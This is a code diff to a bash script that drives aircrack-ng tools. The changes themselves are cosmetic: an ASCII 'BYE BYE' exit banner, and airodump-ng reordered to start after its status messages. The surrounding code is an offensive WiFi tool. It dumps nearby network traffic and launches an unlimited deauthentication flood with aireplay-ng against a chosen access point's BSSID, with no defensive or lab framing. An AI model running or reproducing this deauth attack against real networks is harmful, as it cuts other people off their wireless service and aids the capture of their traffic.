@@ -151,6 +151,15 @@ cleanup() {
         kill "$deauth_pid" &>/dev/null
     fi
     revert_to_managed_mode
+    echo -e "${RED}"
+    echo "  B)bbbb   Y)    yy E)eeeeee    B)bbbb   Y)    yy E)eeeeee "
+    echo "  B)   bb   Y)  yy  E)          B)   bb   Y)  yy  E)       "
+    echo "  B)bbbb     Y)yy   E)eeeee     B)bbbb     Y)yy   E)eeeee  "
+    echo "  B)   bb     Y)    E)          B)   bb     Y)    E)       "
+    echo "  B)    bb    Y)    E)          B)    bb    Y)    E)       "
+    echo "  B)bbbbb     Y)    E)eeeeee    B)bbbbb     Y)    E)eeeeee "
+    echo -e "${ENDCOLOR}"
+    sleep 4
     exit 0
 }
 
@@ -221,11 +230,12 @@ function_mon() {
     sleep 5
 
     # Start airodump-ng in the background
-    airodump-ng "$wire" &
-    airodump_pid=$!
     print_color_text "$CYAN" "---------------------------"
     print_color_text "$CYAN" "Dumping network traffic..."
     print_color_text "$CYAN" "---------------------------"
+    sleep 2
+    airodump-ng "$wire" &
+    airodump_pid=$!
     sleep 15
     kill "$airodump_pid"
     echo ""
@@ -257,6 +267,7 @@ function_mon() {
         print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
         sleep 2
         aireplay-ng --deauth 0 -a "$BSSID" "$wire" &
+        clear
         deauth_pid=$!
         # Wait for user to terminate deauth attack
         print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
